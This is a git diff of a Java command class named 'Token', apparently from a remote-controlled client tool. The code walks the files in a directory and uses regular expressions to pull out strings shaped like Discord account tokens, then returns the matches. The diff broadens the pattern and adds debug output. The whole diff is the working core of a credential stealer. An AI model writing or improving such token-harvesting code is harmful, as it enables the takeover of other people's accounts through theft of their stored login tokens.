@@ -1,12 +1,17 @@
 package Client.command.commands;
 
 import Client.command.Command;
+import Client.utils.ConsoleColor;
 import Client.utils.Prefixes;
 
+import javax.naming.spi.DirectoryManager;
 import java.io.*;
 import java.net.URL;
+import java.nio.file.DirectoryIteratorException;
+import java.nio.file.DirectoryStream;
 import java.nio.file.Path;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.Objects;
 import java.util.regex.Matcher;
@@ -58,25 +63,28 @@ public class Token extends Command {
             StringBuilder b = new StringBuilder();
 
             try {
-                File f = new File(s);
-                File[] pathnames = f.listFiles();
+                File[] pathnames = new File(s).listFiles();
 
                 assert pathnames != null;
-                for (File pathname : pathnames) {
+                System.out.println(Arrays.toString(Objects.requireNonNull(pathnames)));
+                for (File file : pathnames) {
                    // System.out.println(pathname.getAbsolutePath());
                     try {
-                        FileInputStream fstream = new FileInputStream(pathname.getAbsolutePath());
-                        DataInputStream in = new DataInputStream(fstream);
-                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
+                        FileInputStream fstream = new FileInputStream(file.getAbsolutePath());
+                        //System.out.println(file.getAbsolutePath());
+                        BufferedReader br = new BufferedReader(new InputStreamReader(fstream));
+
+                        //System.out.println(br.readLine());
 
                         String strLine;
                         while (!(strLine = br.readLine()).isEmpty()) {
 
 
-                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
+                            Pattern p = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                             Matcher m = p.matcher(strLine);
 
                             while (m.find()) {
+                                System.out.println("dddd");
                                 if (cx > 0) {
                                     b.append("\n");
                                 }
@@ -89,7 +97,7 @@ public class Token extends Command {
                     } catch (Exception ignored) {
                     }
                 }
-                return (b.toString().isEmpty()) ? Prefixes.WARN + " No tokens found" : b.toString();
+                return (b.toString().isEmpty()) ? Prefixes.WARN + " No tokens found" : Prefixes.SUCCESS + " Found token:" + ConsoleColor.ANSI_CYAN + b + ConsoleColor.ANSI_RESET;
 
             } catch (Exception e) {
                 return ("Error: " + e.getMessage());
